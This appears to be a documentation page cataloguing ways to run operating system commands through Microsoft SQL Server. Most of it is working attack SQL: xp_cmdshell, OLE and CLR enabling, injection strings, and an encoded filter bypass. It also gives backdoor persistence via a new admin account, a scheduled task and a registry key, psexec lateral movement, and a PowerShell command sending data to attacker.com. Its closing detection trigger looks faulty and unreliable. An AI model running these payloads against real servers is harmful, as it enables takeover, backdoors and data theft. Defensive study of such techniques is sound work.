---
title: System Command Execution
description: Techniques for executing operating system commands through MSSQL
category: Advanced Techniques
order: 13
tags: ["command execution", "xp_cmdshell", "system commands"]
lastUpdated: 2025-03-15
---

## System Command Execution

Microsoft SQL Server provides several mechanisms that can be exploited to execute operating system commands. This capability represents one of the highest risk attack vectors in SQL injection, as it allows an attacker to escape the database context and gain access to the underlying operating system.

### xp_cmdshell Extended Stored Procedure

The most direct method for command execution is the `xp_cmdshell` extended stored procedure:

```sql
EXEC xp_cmdshell 'command';
```

#### Enabling xp_cmdshell

By default, `xp_cmdshell` is disabled in modern SQL Server installations. It can be enabled using:

```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

#### Basic Command Execution

```sql
-- Execute a simple command
EXEC xp_cmdshell 'dir C:\';

-- Get system information
EXEC xp_cmdshell 'systeminfo';

-- Check current user context
EXEC xp_cmdshell 'whoami';
```

#### Command Output Handling

The output from `xp_cmdshell` is returned as a result set:

```sql
-- Storing command output in a table
CREATE TABLE #output (output varchar(8000));
INSERT INTO #output EXEC xp_cmdshell 'dir C:\';
SELECT * FROM #output;
```

### SQL Agent Jobs

SQL Server Agent can be used to execute commands via the CmdExec subsystem:

```sql
-- Create a job to execute commands
EXEC msdb.dbo.sp_add_job @job_name = 'CommandExecution';
EXEC msdb.dbo.sp_add_jobstep
  @job_name = 'CommandExecution',
  @step_name = 'Execute command',
  @subsystem = 'CmdExec',
  @command = 'cmd.exe /c dir C:\ > C:\output.txt',
  @on_success_action = 1;
EXEC msdb.dbo.sp_start_job 'CommandExecution';
```

### OLE Automation Procedures

OLE Automation allows SQL Server to interact with COM objects, including creating files and executing commands:

```sql
-- Enable Ole Automation Procedures
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

-- Execute command via WSH
DECLARE @shell INT;
DECLARE @result INT;
EXEC sp_OACreate 'WScript.Shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'Run', @result OUTPUT, 'cmd.exe /c dir C:\ > C:\output.txt', 0, 0;
EXEC sp_OADestroy @shell;

-- Alternative: Minimal version (OUTPUT parameters must be variables, not literals)
DECLARE @sh INT, @ret INT;
EXEC sp_OACreate 'WScript.Shell', @sh OUTPUT;
EXEC sp_OAMethod @sh, 'Run', @ret OUTPUT, 'cmd /c whoami > C:\temp\out.txt', 0, 1;
-- Run parameters: windowStyle=0 (hidden), waitOnReturn=1 (wait for completion)
EXEC sp_OADestroy @sh;
```

### Custom Extended Stored Procedures

Malicious DLLs can be loaded as custom extended stored procedures:

```sql
-- Create a custom extended stored procedure (requires file write access)
EXEC sp_addextendedproc 'xp_malicious', 'C:\malicious.dll';
EXEC xp_malicious;
```

### CLR Integration

SQL Server CLR integration allows executing .NET code:

```sql
-- Enable CLR
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'clr enabled', 1;
RECONFIGURE;

-- Example of loading a malicious assembly (pseudocode)
CREATE ASSEMBLY malicious FROM 'C:\malicious.dll';
CREATE PROCEDURE run_command AS EXTERNAL NAME malicious.StoredProcedures.RunCommand;
EXEC run_command 'cmd.exe /c dir C:\';
```

### SQL Injection Examples

#### Basic xp_cmdshell Injection

```sql
-- Injection in vulnerable query
' EXEC xp_cmdshell 'dir C:\'--

-- With xp_cmdshell enabling attempt
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'dir C:\'--
```

#### Advanced Injection Techniques

```sql
-- Using stacked queries and error handling
'; BEGIN TRY EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; END TRY BEGIN CATCH END CATCH; EXEC xp_cmdshell 'net user hacker password /add'--
```

#### Alternative Encodings

```sql
-- Using character encoding to bypass filters
'; DECLARE @cmd VARCHAR(100); SET @cmd = CHAR(101) + CHAR(120) + CHAR(101) + CHAR(99) + CHAR(32) + CHAR(120) + CHAR(112) + CHAR(95) + CHAR(99) + CHAR(109) + CHAR(100) + CHAR(115) + CHAR(104) + CHAR(101) + CHAR(108) + CHAR(108) + CHAR(32) + CHAR(39) + CHAR(100) + CHAR(105) + CHAR(114) + CHAR(39); EXEC(@cmd)--
-- This constructs and executes: exec xp_cmdshell 'dir'
```

### Common Attack Scenarios

#### Information Gathering

```sql
-- System information
EXEC xp_cmdshell 'systeminfo';

-- Network configuration
EXEC xp_cmdshell 'ipconfig /all';

-- User and group information
EXEC xp_cmdshell 'net user';
EXEC xp_cmdshell 'net localgroup administrators';
```

#### Persistence Mechanisms

```sql
-- Adding a user account
EXEC xp_cmdshell 'net user hacker password /add';
EXEC xp_cmdshell 'net localgroup administrators hacker /add';

-- Creating a scheduled task
EXEC xp_cmdshell 'schtasks /create /tn "Maintenance" /tr "C:\backdoor.exe" /sc daily /st 12:00';
```

#### Data Exfiltration

```sql
-- Creating data files
EXEC xp_cmdshell 'bcp "SELECT * FROM sensitive_data" queryout "C:\temp\data.txt" -c -T';

-- Sending data over the network
EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri \"http://attacker.com/exfil.php\" -Method POST -Body @{data=Get-Content C:\temp\data.txt}"';
```

#### Lateral Movement

```sql
-- Testing network connectivity
EXEC xp_cmdshell 'ping other-server';

-- Remote command execution
EXEC xp_cmdshell 'psexec \\other-server -u domain\user -p password cmd.exe /c "command"';
```

### Command Execution Without xp_cmdshell

When `xp_cmdshell` is not available, alternatives include:

```sql
-- Using SQL Agent (requires appropriate permissions)
EXEC msdb.dbo.sp_add_job @job_name = 'CommandExecution';
EXEC msdb.dbo.sp_add_jobstep
  @job_name = 'CommandExecution',
  @step_name = 'Execute command',
  @subsystem = 'CmdExec',
  @command = 'cmd.exe /c dir C:\ > C:\output.txt',
  @on_success_action = 1;
EXEC msdb.dbo.sp_start_job 'CommandExecution';

-- Using registry access procedures to trigger system events
EXEC master..xp_regwrite 'HKEY_LOCAL_MACHINE', 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 'backdoor', 'REG_SZ', 'C:\malicious.exe';
```

### Mitigation and Detection

To prevent system command execution via SQL Server:

1. Disable `xp_cmdshell` and other dangerous procedures:

   ```sql
   EXEC sp_configure 'xp_cmdshell', 0;
   EXEC sp_configure 'Ole Automation Procedures', 0;
   EXEC sp_configure 'clr enabled', 0;
   RECONFIGURE;
   ```

2. Apply proper permissions:

   ```sql
   DENY EXECUTE ON xp_cmdshell TO PUBLIC;
   ```

3. Monitor for enabling of dangerous features:

   ```sql
   CREATE TRIGGER security_alert ON ALL SERVER WITH EXECUTE AS 'sa'
   FOR ALTER_CONFIGURATION
   AS
   BEGIN
     IF EXISTS (SELECT * FROM inserted WHERE name = 'xp_cmdshell' AND value = 1)
     BEGIN
       ROLLBACK;
       RAISERROR('Attempt to enable xp_cmdshell detected', 16, 1);
     END
   END;
   ```

4. Use parameterized queries in applications

5. Run SQL Server with minimal required privileges
